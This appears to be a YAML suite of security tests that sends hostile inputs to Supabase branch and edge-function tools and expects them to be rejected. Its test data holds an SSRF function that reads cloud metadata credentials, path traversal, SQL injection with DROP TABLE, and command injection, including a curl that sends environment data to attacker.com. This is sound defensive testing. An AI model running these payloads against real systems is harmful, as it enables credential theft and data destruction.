            result: null
        - case_id: SEC-001-C
          description: Attempt to deploy function that makes SSRF requests to cloud metadata services
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: "Deno.serve(async (req: Request) => {\n  const targets = [\n    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',\n    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',\n    'http://127.0.0.1:8000/internal/admin'\n  ];\n  const results = await Promise.all(targets.map(url => \n    fetch(url).then(r => r.text()).catch(e => e.message)\n  ));\n  return new Response(JSON.stringify(results));\n});\n"
                      name: index.ts
                name: malicious_ssrf
                project_id: ${VALID_PROJECT_ID}
                verify_jwt: false
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
    - test_id: SEC-002
      name: Path Traversal in File Upload
      purpose: |
        Tests if malicious file paths can be used to write files outside intended directories
        or overwrite critical system files during edge function deployment. This could allow
        an attacker to compromise the deployment system, inject malicious code into other
        functions, or cause denial of service. Impact: System file manipulation, privilege
        escalation, cross-tenant contamination.
      prerequisites:
        - description: Valid Supabase project ID from user configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-002-A
          description: Attempt path traversal using relative paths to escape function directory
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: malicious:x:0:0:root:/root:/bin/bash
                      name: ../../../etc/passwd
                    - content: Deno.serve(() => new Response('ok'));
                      name: index.ts
                name: path_traversal_test
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
        - case_id: SEC-002-B
          description: Attempt to use absolute paths to write to system directories
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: export const backdoor = true;
                      name: /tmp/malicious.ts
                    - content: Deno.serve(() => new Response('ok'));
                      name: index.ts
                name: absolute_path_test
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
        - case_id: SEC-002-C
          description: Attempt path traversal in import_map_path parameter
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('ok'));
                      name: index.ts
                import_map_path: ../../../etc/shadow
                name: import_map_traversal
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
    - test_id: SEC-003
      name: Unauthorized Cross-Project Access
      purpose: |
        Tests if an attacker can deploy edge functions to projects they don't own by
        guessing or enumerating project IDs. This could allow unauthorized code deployment
        to victim projects, leading to data breaches, service disruption, or malicious
        function execution under another user's account. Impact: Cross-tenant data breach,
        unauthorized access, account compromise.
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to deploy function using non-existent project ID
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('unauthorized'));
                      name: index.ts
                name: unauthorized_function
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - postgresql://[^\s]+
                - '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\.[a-zA-Z0-9-]+\.supabase'
            result: null
        - case_id: SEC-003-B
          description: Attempt SQL injection in project_id to bypass authorization
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                name: sqli_test_func
                project_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages leak sensitive information such as internal paths,
        database credentials, API keys, or system architecture details. Information
        disclosure can help attackers plan more sophisticated attacks by revealing
        internal system structure, technologies used, or valid identifiers.
        Impact: Reconnaissance for advanced attacks, credential exposure.
      prerequisites:
        - description: Valid Supabase project ID from user configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-004-A
          description: Trigger error with oversized file content to check for stack traces or internal paths
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: ${'A' * 10485760}
                      name: index.ts
                name: oversized_content_test
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /opt/[a-zA-Z0-9_-]+/
                - /var/[a-zA-Z0-9_-]+/
                - File "[^"]+\.py", line \d+
                - at [A-Za-z]+\.[a-z]+\([^)]+:\d+:\d+\)
                - SUPABASE_[A-Z_]+
                - Bearer [a-zA-Z0-9_-]{20,}
            result: null
        - case_id: SEC-004-B
          description: Use invalid entrypoint to check if error reveals file system structure
          input:
            tool: deploy_edge_function
            arguments:
                entrypoint_path: ../../../../etc/passwd
                files:
                    - content: Deno.serve(() => new Response('test'));
                      name: index.ts
                name: invalid_entrypoint_test
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /usr/[a-zA-Z0-9_-]+/
                - 'root:.*:0:0:'
            result: null
    - test_id: SEC-001
      name: Project ID Path Traversal and Unauthorized Access
      purpose: |
        Tests if the project_id parameter is vulnerable to path traversal attacks
        that could allow access to other projects or system resources. Exploiting
        this could lead to unauthorized branch creation on other tenants' projects,
        resulting in resource abuse, data isolation breaches, and potential
        cross-tenant attacks.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt path traversal via project_id to access parent directories
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: test-cost-id
                name: malicious-branch
                project_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /home/[a-zA-Z0-9_-]+
                - Bearer [a-zA-Z0-9_-]{20,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to access another tenant's project using malformed UUID
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: test-cost-id
                name: unauthorized-branch
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project_ref":\s*"[a-z0-9]{20,}"
                - api[_-]?key":\s*"[a-zA-Z0-9_-]{20,}"
            result: null
        - case_id: SEC-001-C
          description: SQL injection attempt in project_id parameter
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: test-cost-id
                name: injection-test
                project_id: ''' OR ''1''=''1'' --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
    - test_id: SEC-002
      name: Cost Confirmation Bypass and Authorization
      purpose: |
        Tests if the confirm_cost_id validation can be bypassed to create branches
        without proper cost authorization. Successful exploitation could lead to
        unauthorized resource consumption, billing fraud, and denial of service
        through resource exhaustion on victim accounts.
      test_cases:
        - case_id: SEC-002-A
          description: Attempt to bypass cost confirmation with invalid ID
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: invalid-cost-id-bypass
                name: bypass-branch
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
        - case_id: SEC-002-B
          description: Attempt SQL injection in confirm_cost_id to bypass validation
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ''' OR 1=1 --'
                name: sql-injection-branch
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - SELECT.*FROM
                - database error
                - pg_.*\(
            result: null
        - case_id: SEC-002-C
          description: Attempt to reuse another user's cost confirmation ID
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
                name: stolen-cost-id
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
    - test_id: SEC-003
      name: Branch Name Injection and Command Injection
      purpose: |
        Tests if the branch name parameter is vulnerable to injection attacks that
        could lead to command execution, script injection, or database manipulation.
        Since branch names may be used in database operations, file systems, or
        shell commands, successful injection could result in remote code execution,
        data corruption, or privilege escalation.
      test_cases:
        - case_id: SEC-003-A
          description: Command injection attempt via branch name
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -o /tmp/creds
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - AKIA[0-9A-Z]{16}
                - aws_access_key_id
                - SecretAccessKey
            result: null
        - case_id: SEC-003-B
          description: SQL injection in branch name to manipulate database
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test'; DROP TABLE branches; --
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - syntax error
                - relation.*does not exist
                - pg_.*error
            result: null
        - case_id: SEC-003-C
          description: Path traversal in branch name to write to arbitrary locations
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: ../../../tmp/malicious
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error responses leak sensitive information such as internal paths,
        database connection strings, API keys, authentication tokens, or system
        architecture details. Information disclosure can aid attackers in
        reconnaissance and planning more sophisticated attacks.
      prerequisites:
        - description: A valid project ID from your Supabase account
          variable: VALID_PROJECT_ID
        - description: A valid cost confirmation ID from calling confirm_cost
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-004-A
          description: Check for sensitive data leakage in invalid project_id error
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test-branch
                project_id: invalid-project-id-xyzabc123
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - postgresql://[^\s]+
                - postgres://[^\s]+
                - password["']?:\s*["'][^"']{8,}
                - Bearer [a-zA-Z0-9_-]{20,}
                - SUPABASE_[A-Z_]+=[^\s]+
                - /var/lib/[a-zA-Z0-9_/-]+
                - /home/[a-zA-Z0-9_/-]+
                - api[_-]?key":\s*"eyJ[a-zA-Z0-9_-]+"
            result: null
        - case_id: SEC-004-B
          description: Check for stack traces and internal paths in malformed request
          input:
            tool: create_branch
            arguments:
                confirm_cost_id: malformed-id-<script>alert(1)</script>
                name: test
                project_id: ${VALID_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - at\s+[a-zA-Z0-9_]+\s+\([^)]+\.[jt]s:\d+:\d+\)
                - Traceback.*File ".*\.py"
                - /usr/local/[a-zA-Z0-9_/-]+\.(js|py|rb|go)
                - node_modules/[a-zA-Z0-9_/-]+/[a-zA-Z0-9_.-]+
            result: null
    - test_id: SEC-001
      name: Unauthorized Branch Deletion via ID Manipulation
      purpose: |
        Tests for authorization bypass vulnerabilities where an attacker could delete
        branches belonging to other users/projects by manipulating the branch_id parameter.
        Critical impact: Attackers could destroy development environments, cause data loss,
        and disrupt workflows across different tenants or projects.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to delete branch using null UUID (potential bypass)
          input:
            tool: delete_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - api[_-]?key["']?\s*[:=]\s*["']?[a-zA-Z0-9_-]{20,}
                - Bearer [a-zA-Z0-9_-]{20,}
                - password["']?\s*[:=]\s*["']?\S+
            result: null
        - case_id: SEC-001-B
          description: Attempt to delete branch using another tenant's branch ID format
          input:
            tool: delete_branch
            arguments:
                branch_id: ffffffff-ffff-ffff-ffff-ffffffffffff
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project[_-]?ref["']?\s*[:=]\s*["']?[a-zA-Z0-9_-]+
                - connection[_-]?string
                - postgres://[^\s]+
            result: null
    - test_id: SEC-002
      name: Path Traversal via Branch ID Parameter
      purpose: |
        Tests for path traversal vulnerabilities if branch_id is used in file system
        operations without proper sanitization. Attackers could potentially access or
        delete files outside the intended branch directory structure.
        Critical impact: Unauthorized file access, deletion of system files, or exposure
        of sensitive configuration data.
      test_cases:
        - case_id: SEC-002-A
          description: Unix-style path traversal attempt
          input:
            tool: delete_branch
            arguments:
                branch_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/shadow
                - /home/[a-zA-Z0-9_-]+/
            result: null
        - case_id: SEC-002-B
          description: Null byte injection for path traversal
          input:
            tool: delete_branch
            arguments:
                branch_id: valid-id%00../../config
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - database[_-]?url
                - SUPABASE[_-]?[A-Z_]+["']?\s*[:=]
            result: null
    - test_id: SEC-003
      name: SQL Injection in Branch ID Lookup
      purpose: |
        Tests for SQL injection vulnerabilities if branch_id is directly interpolated
        into SQL queries without parameterization. Successful exploitation could lead
        to unauthorized data access, modification, or deletion across the entire database.
        Critical impact: Full database compromise, data exfiltration, and potential
        privilege escalation to database administrator level.
      test_cases:
        - case_id: SEC-003-A
          description: Boolean-based blind SQL injection
          input:
            tool: delete_branch
            arguments:
                branch_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - syntax error at or near
                - pg_[a-z_]+\(
                - ERROR:\s+column
            result: null
        - case_id: SEC-003-B
          description: Stacked query injection for potential data manipulation
          input:
            tool: delete_branch
            arguments:
                branch_id: valid-id'; DROP TABLE branches CASCADE; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - table "[a-zA-Z0-9_]+" does not exist
                - DROP TABLE
                - permission denied for
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests whether error messages leak sensitive information such as internal paths,
        database schema details, API keys, or system configuration. Information disclosure
        helps attackers map the system architecture and identify additional attack vectors.
        High impact: Facilitates further attacks by revealing system internals.
      test_cases:
        - case_id: SEC-004-A
          description: Trigger error with special characters to expose stack trace
          input:
            tool: delete_branch
            arguments:
                branch_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - /var/www/[^\s]+
                - /usr/local/[^\s]+
                - at [a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\([^)]+:[0-9]+:[0-9]+\)
                - Traceback \(most recent call last\)
            result: null
        - case_id: SEC-004-B
          description: Extremely long input to trigger verbose error response
          input:
            tool: delete_branch
            arguments:
                branch_id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - -32602
            error_response_must_not_match_regex:
                - supabase[_-]?[a-z]+[_-]?key
                - '[a-f0-9]{32,}'
                - version [0-9]+\.[0-9]+\.[0-9]+
            result: null
    - test_id: SEC-001
      name: Path Traversal in Branch ID Parameter
      purpose: |
        Tests whether the branch_id parameter is vulnerable to path traversal attacks
        that could allow unauthorized access to file system resources or internal
        branch configurations. An attacker could potentially access or merge branches
        outside their authorization scope, leading to unauthorized code deployment or
        data exposure. This is CRITICAL as it could result in production system compromise.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt directory traversal using relative path notation
          input:
            tool: merge_branch
            arguments:
                branch_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /home/[a-zA-Z0-9_-]+
                - supabase_admin
            result: null
        - case_id: SEC-001-B
          description: Attempt absolute path injection to access system files
          input:
            tool: merge_branch
            arguments:
                branch_id: /etc/shadow
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - \$[0-9]\$[a-zA-Z0-9./]+
                - root:\$
            result: null
        - case_id: SEC-001-C
          description: Attempt Windows-style path traversal
          input:
            tool: merge_branch
            arguments:
                branch_id: ..\..\..\windows\system32\config\sam
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
    - test_id: SEC-002
      name: SQL Injection in Branch ID Parameter
      purpose: |
        Tests whether the branch_id parameter is vulnerable to SQL injection attacks.
        If the branch_id is used in database queries without proper sanitization,
        an attacker could execute arbitrary SQL commands, potentially accessing
        sensitive branch data, user credentials, or modifying database state.
        This is CRITICAL as it could lead to complete database compromise.
      test_cases:
        - case_id: SEC-002-A
          description: Classic SQL injection with OR condition
          input:
            tool: merge_branch
            arguments:
                branch_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - SQL syntax.*error
                - PostgreSQL.*ERROR
                - pg_[a-z_]+\(
            result: null
        - case_id: SEC-002-B
          description: SQL injection with UNION-based attack
          input:
            tool: merge_branch
            arguments:
                branch_id: ''' UNION SELECT api_key, secret FROM auth.users--'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - '[a-zA-Z0-9]{32,}'
                - Bearer [a-zA-Z0-9_-]{20,}
                - sk-[a-zA-Z0-9]{32,}
            result: null
        - case_id: SEC-002-C
          description: Time-based blind SQL injection
          input:
            tool: merge_branch
            arguments:
                branch_id: '''; WAITFOR DELAY ''00:00:05''--'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
    - test_id: SEC-003
      name: Unauthorized Branch Access and Privilege Escalation
      purpose: |
        Tests whether the tool properly validates authorization for branch merge
        operations. An attacker could attempt to merge branches from other projects,
        organizations, or restricted environments, leading to unauthorized code
        deployment or cross-tenant data exposure. This is CRITICAL as it could
        compromise multi-tenant security boundaries.
      prerequisites:
        - description: A valid branch ID from the user's legitimate project
          variable: VALID_BRANCH_ID
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to merge using another tenant's branch ID pattern
          input:
            tool: merge_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project_ref":\s*"[a-zA-Z0-9]{20,}"
                - organization_id":\s*"[a-zA-Z0-9-]{36}"
            result: null
        - case_id: SEC-003-B
          description: Attempt cross-project branch merge with crafted ID
          input:
            tool: merge_branch
            arguments:
                branch_id: admin_production_branch
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            result: null
        - case_id: SEC-003-C
          description: Test information disclosure in error messages for invalid branch
          input:
            tool: merge_branch
            arguments:
                branch_id: nonexistent_branch_xyz123
          expected_output:
            error_present: true
            error_code_one_of:
                - 404
                - -32602
            error_response_must_not_match_regex:
                - database.*connection.*string
                - password.*=.*
                - api[_-]?key.*[a-zA-Z0-9]{20,}
                - /var/lib/[a-z/]+
                - 192\.168\.[0-9]{1,3}\.[0-9]{1,3}
            result: null
    - test_id: SEC-004
      name: Command Injection via Branch ID
      purpose: |
        Tests whether the branch_id parameter is vulnerable to command injection
        attacks. If the branch_id is passed to shell commands or system calls without
        proper sanitization (e.g., for git operations, file operations), an attacker
        could execute arbitrary system commands, leading to complete server compromise.
        This is CRITICAL as it provides direct system-level access.
      test_cases:
        - case_id: SEC-004-A
          description: Command injection using semicolon separator
          input:
            tool: merge_branch
            arguments:
                branch_id: main; cat /etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - daemon:[x*]:[0-9]+:[0-9]+
            result: null
        - case_id: SEC-004-B
          description: Command injection using backticks for command substitution
          input:
            tool: merge_branch
            arguments:
                branch_id: main`whoami`
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - uid=[0-9]+\([a-z]+\)
                - gid=[0-9]+\([a-z]+\)
            result: null
        - case_id: SEC-004-C
          description: Command injection using pipe operator
          input:
            tool: merge_branch
            arguments:
                branch_id: main | env
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - AWS_ACCESS_KEY_ID=
                - DATABASE_URL=
                - SUPABASE_[A-Z_]+=
            result: null
    - test_id: SEC-001
      name: Unauthorized Branch Access via ID Manipulation
      purpose: |
        Tests if the tool properly validates branch ownership and authorization before
        performing destructive reset operations. An attacker could attempt to reset
        branches belonging to other users/organizations by guessing or enumerating
        branch IDs, leading to data loss and service disruption.
        Impact: CRITICAL - Unauthorized data deletion, service disruption, cross-tenant attacks.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to reset branch with null UUID (potential system branch access)
          input:
            tool: reset_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - internal_id["']?\s*:\s*["']?[0-9]+
                - owner["']?\s*:\s*["']?[a-zA-Z0-9-]+
                - project["']?\s*:\s*["']?[a-zA-Z0-9-]+
            result: null
        - case_id: SEC-001-B
          description: Attempt to reset branch using path traversal in branch_id
          input:
            tool: reset_branch
            arguments:
                branch_id: ../../../admin/main-branch
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            result: null
        - case_id: SEC-001-C
          description: Attempt to reset branch using SQL injection pattern in branch_id
          input:
            tool: reset_branch
            arguments:
                branch_id: test' OR '1'='1' --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - SQL syntax error
                - PostgreSQL.*ERROR
                - at line [0-9]+
            result: null
    - test_id: SEC-002
      name: Migration Version Code Injection
      purpose: |
        Tests if the migration_version parameter properly sanitizes input before
        processing. Attackers could inject malicious commands, SQL queries, or
        system commands through this parameter to execute arbitrary code or
        manipulate the database state beyond intended reset operations.
        Impact: CRITICAL - Remote code execution, database compromise, full system access.
      prerequisites:
        - description: Obtain from user's existing branch or test environment setup
          variable: VALID_BRANCH_ID
      test_cases:
        - case_id: SEC-002-A
          description: SQL injection attempt in migration_version parameter
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: 20240101000000'; DROP TABLE migrations CASCADE; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - table.*dropped
                - CASCADE
                - SQL.*executed
            result: null
        - case_id: SEC-002-B
          description: Command injection attempt using shell metacharacters
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: 20240101000000; cat /etc/passwd > /tmp/pwned
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            result: null
        - case_id: SEC-002-C
          description: Path traversal in migration version to access arbitrary migration files
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            result: null
    - test_id: SEC-003
      name: Information Disclosure in Error Responses
      purpose: |
        Tests if error messages expose sensitive information such as internal
        database structure, file paths, configuration details, or stack traces.
        This information could help attackers map the system architecture and
        plan more sophisticated attacks.
        Impact: HIGH - Reveals attack surface, assists reconnaissance, exposes internal structure.
      prerequisites:
        - description: Obtain from user's existing branch or test environment setup
          variable: VALID_BRANCH_ID
      test_cases:
        - case_id: SEC-003-A
          description: Trigger error with malformed branch_id to check for stack trace leakage
          input:
            tool: reset_branch
            arguments:
                branch_id: <script>alert(1)</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - at\s+[a-zA-Z0-9_.]+\s*\([^)]+\.[a-z]{2,4}:[0-9]+:[0-9]+\)
                - /home/[a-zA-Z0-9_-]+/
                - /var/[a-zA-Z0-9_-]+/
                - File "[^"]+", line [0-9]+
                - Traceback \(most recent call last\)
            result: null
        - case_id: SEC-003-B
          description: Invalid migration version format to check for database query exposure
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: INVALID_VERSION_12345!@#$%
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - SELECT.*FROM.*migrations
                - WHERE.*version.*=
                - pg_catalog
                - information_schema
                - database connection string
            result: null
        - case_id: SEC-003-C
          description: Excessively long branch_id to check for buffer overflow error details
          input:
            tool: reset_branch
            arguments:
                branch_id: ${'A' * 10000}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - buffer overflow
                - memory allocation failed
                - 0x[0-9a-fA-F]{8,}
                - segmentation fault
            result: null
    - test_id: SEC-004
      name: Denial of Service via Parameter Manipulation
      purpose: |
        Tests if the tool properly handles edge cases and malicious inputs that
        could cause resource exhaustion, infinite loops, or system crashes.
        Attackers could exploit this to disrupt service availability for all users.
        Impact: HIGH - Service disruption, resource exhaustion, system instability.
      prerequisites:
        - description: Obtain from user's existing branch or test environment setup
          variable: VALID_BRANCH_ID
      test_cases:
        - case_id: SEC-004-A
          description: Extremely long migration_version string (bounded at 1MB)
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: ${'9' * 1048576}
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - -32602
            result: null
        - case_id: SEC-004-B
          description: Unicode and special characters that may break parsing
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: "20240101000000\0\x01\x02\uFEFF\uFFFE"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            result: null
        - case_id: SEC-004-C
          description: Deeply nested JSON-like string in branch_id
          input:
            tool: reset_branch
            arguments:
                branch_id: '{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":"value"}}}}}}}}}}}'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            result: null
    - test_id: SEC-001
      name: Branch ID Command Injection via Shell Metacharacters
      purpose: |
        Tests if the branch_id parameter is vulnerable to command injection attacks.
        Git branch operations may involve shell command execution. If the branch_id
        is passed unsanitized to shell commands, attackers could execute arbitrary
        system commands, leading to complete system compromise, data exfiltration,
        or malicious code execution on the server.
        Impact: CRITICAL - Remote Code Execution, full system compromise.
      test_cases:
        - case_id: SEC-001-A
          description: Command injection using semicolon separator
          input:
            tool: rebase_branch
            arguments:
                branch_id: main; cat /etc/passwd > /tmp/pwned; echo vulnerable
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /bin/bash
                - /home/[a-zA-Z0-9_-]+
            result: null
        - case_id: SEC-001-B
          description: Command injection using backtick command substitution
          input:
            tool: rebase_branch
            arguments:
                branch_id: test`whoami`branch
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - uid=[0-9]+\([a-zA-Z0-9_-]+\)
                - postgres
                - supabase
            result: null
        - case_id: SEC-001-C
          description: Command injection using pipe operator for chained commands
          input:
            tool: rebase_branch
            arguments:
                branch_id: feature | curl http://attacker.com?data=$(env) |
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - AWS_[A-Z_]+=
                - SECRET[A-Z_]*=
                - DATABASE_URL=
            result: null
    - test_id: SEC-002
      name: Path Traversal via Branch ID Manipulation
      purpose: |
        Tests if the branch_id parameter allows path traversal attacks to access
        or manipulate files outside the intended git repository directory.
        Git branch operations involve file system access. If branch_id is used in
        file paths without proper sanitization, attackers could read sensitive
        configuration files, access other repositories, or manipulate critical
        system files.
        Impact: HIGH - Unauthorized file access, configuration exposure, potential
        data breach across tenant boundaries.
      test_cases:
        - case_id: SEC-002-A
          description: Directory traversal to access system files
          input:
            tool: rebase_branch
            arguments:
                branch_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /etc/shadow
                - nologin
            result: null
        - case_id: SEC-002-B
          description: Path traversal to access adjacent tenant repositories
          input:
            tool: rebase_branch
